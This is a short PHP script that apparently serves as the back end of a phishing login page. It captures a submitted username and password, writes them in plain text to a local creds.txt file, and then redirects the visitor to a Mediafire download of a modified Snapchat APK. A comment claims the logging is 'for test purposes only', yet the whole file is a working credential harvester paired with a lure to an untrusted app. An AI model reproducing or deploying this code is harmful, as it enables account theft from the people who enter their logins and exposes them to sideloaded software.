<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);
    
    // Log credentials locally (for test purposes only)
    $log = fopen("creds.txt", "a");
    fwrite($log, "User: $username | Pass: $password\n");
    fclose($log);

    // Redirect to Mediafire APK link
    header("Location: https://www.mediafire.com/file/6dor3so1rwmyayx/Snapchat-v13.36.2.0-MOD-OTR-%2528Getmodsapk.com%2529.apk/file");
    exit();
}
?>
